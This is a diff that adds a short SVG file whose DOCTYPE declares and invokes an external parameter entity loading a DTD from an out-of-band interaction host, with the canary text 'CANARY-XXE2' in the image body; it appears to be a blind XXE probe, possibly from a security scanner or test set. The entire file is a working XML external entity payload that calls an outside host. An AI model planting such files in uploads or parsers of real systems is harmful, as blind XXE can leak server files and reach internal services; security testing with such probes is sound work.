@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY % ext SYSTEM "http://svg-param.d9j7ocsgtqkls609354g7qfi57qo6s8j6.oast.pro/dtd.xml">
+  %ext;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="600" height="200"><text x="5" y="20">CANARY-XXE2</text></svg>
